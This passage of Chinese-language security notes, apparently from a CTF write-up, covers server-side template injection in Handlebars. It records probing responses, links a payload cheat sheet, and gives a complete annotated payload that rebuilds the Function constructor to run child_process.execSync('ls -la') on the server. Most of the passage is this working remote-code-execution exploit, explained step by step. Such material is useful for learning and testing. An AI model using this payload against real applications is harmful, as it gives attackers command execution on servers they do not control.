- `{{.}}` 或 `{{this}}`
    - 响应
        `[object Object]`
    - 此处双重花括号的内容被解析为变量/对象，而计算表达式 `{{7*7}}`报错

模板文档 https://handlebarsjs.com/zh/guide/
- 对象表达式
    ```handlebars
    {{对象}}
    ```
- 内置的块助手代码 `each` 和 `with` 允许你更改当前代码块的值。
    ```handlebars
    {{#with 对象}}
    {{属性}}
    {{/with}}

    //

    {{#each 列表}}
        {{this}}
    {{/each}} 
    ```


查看 handlebars 模板已知载荷
- 载荷速查表 
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

- 载荷
    ```handlebars
    // let string = "s"
    {{#with "s" as |string|}} 
    {{#with "e"}}
        // let conslist = "e".split
        {{#with split as |conslist|}} 
            // conslist.pop
            // 清空当前对象保存的函数
            {{this.pop}} 
            // conslist.push(Function)
            // 查找构造器属性后，覆盖为构造器
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            // let codelist = string.split
            {{#with string.split as |codelist|}}
                // codelist.pop
                // 清空当前对象中保存的函数
                {{this.pop}}
                // codelist.push("return require('child_process').execSync('ls -la');")
                // 设置代码载荷
                {{this.push "return require('child_process').execSync('ls -la');"}}
                {{this.pop}}
                // each [Function]
                // 设置当前作用域上下文为构造函数
                {{#each conslist}}
                    // Function.prototype.apply()
                    // MDN 文档中 apply 方法的参数1可任意设置 `this`，而解除调用源的限制
                    // 然而此处（除 null 外）任意修改参数1均可成功执行载荷，即参数1似乎被忽略。
                    // 模板与 MDN 对函数功能的描述不同，最终导致 this 使用当前作用域的 Function
                    // 括号内执行 Function("return require('child_process').execSync('ls -la');")
                    // 执行结果作为 with 语句上下文
                    {{#with (string.sub.apply 1337 codelist)}}
                        // 输出执行结果，若仅执行代码则此处可省略
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}
    ```
    - https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply